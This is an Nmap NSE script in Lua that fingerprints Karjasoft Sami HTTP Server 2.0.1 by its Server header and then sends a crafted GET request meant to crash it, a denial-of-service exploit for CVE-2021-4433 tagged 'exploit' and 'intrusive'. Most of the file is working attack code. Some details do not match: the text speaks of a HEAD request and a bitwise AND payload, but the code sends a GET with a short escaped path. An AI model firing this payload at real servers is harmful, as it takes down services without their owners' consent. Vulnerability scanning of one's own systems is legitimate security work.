local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local vulns = require "vulns"

-- @see http-vuln-cve2021-4433.nse
-- nmap -sS -P0 -p 80 --script=http-vuln-cve2021-4433-dos.nse <targets>
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-vuln-cve2021-4433-dos:
-- |   VULNERABLE:
-- |   KARJASOFT SAMI HTTP SERVER 2.0 HTTP HEAD RREQUEST DENIAL OF SERVICE
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:2021-4433
-- |     Risk factor: MEDIUM  CVSSv3.1: 5.3 (MEDIUM) (/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)
-- |       This script identifies and exploits a denial-of-service vulnerability
-- |       in the KARJASOFT SAMI HTTP SERVER 2.0 web server by sending a payload
-- |       containing a bitwise (AND) operation. When the server processes the
-- |       payload, it causes a memory issue in the web server
-- |
-- |     Disclosure date: 2024-01-17
-- |     References:
-- |       https://www.cve.org/CVERecord?id=CVE-2021-4433
-- |       https://packetstormsecurity.com/files/163138/Sami-HTTP-Server-2.0-Denial-Of-Service.html
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-4433
-- |       https://nvd.nist.gov/vuln/detail/CVE-2021-4433
-- |_      https://vuldb.com/?id.250836


description = [[
This script identifies and exploits a denial-of-service vulnerability
in the KARJASOFT SAMI HTTP SERVER 2.0 web server by sending a payload
containing a bitwise (AND) operation. When the server processes the
payload, it causes a memory issue in the web server
]]

author = "Fernando Mengali <fernando.mengalli()gmail.com>"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"exploit","vuln","intrusive"}

portrule = shortport.http

action = function(host, port)

  local vuln = {
    title = 'KARJASOFT SAMI HTTP SERVER 2.0 HTTP HEAD RREQUEST DENIAL OF SERVICE',
    state = vulns.STATE.NOT_VULN, -- default
    IDS = {CVE = '2021-4433'},
    risk_factor = "MEDIUM",
    scores = {
   CVSSv3 = "5.3 (MEDIUM) (/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)",
 },
    description = [[
This script identifies and exploits a denial-of-service vulnerability 
in the KARJASOFT SAMI HTTP SERVER 2.0 web server by sending a payload 
containing a bitwise (AND) operation. When the server processes the
payload, it causes a memory issue in the web server
]],
    references = {
       'https://www.cve.org/CVERecord?id=CVE-2021-4433',
        'https://vuldb.com/?id.250836',
        'https://packetstormsecurity.com/files/163138/Sami-HTTP-Server-2.0-Denial-Of-Service.html',
        'https://nvd.nist.gov/vuln/detail/CVE-2021-4433'
    },
    dates = {
        disclosure = {year = '2024', month = '01', day = '17'},
    },
  }
local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)  

  local status = false
  local result	

    status, result = http.can_use_head(host, port, nil, "/")
 
  local r = result.header.server

  if  r:match("Sami HTTP Server 2.0.1") then
        result = http.get(host, port, "/\x41\x42\x43\x44\x45\x46\x47\x25\x49")

      vuln.state = vulns.STATE.EXPLOIT
      
      return vuln_report:make_output(vuln)
  else 
  	return "Not Exploited"
  end
end
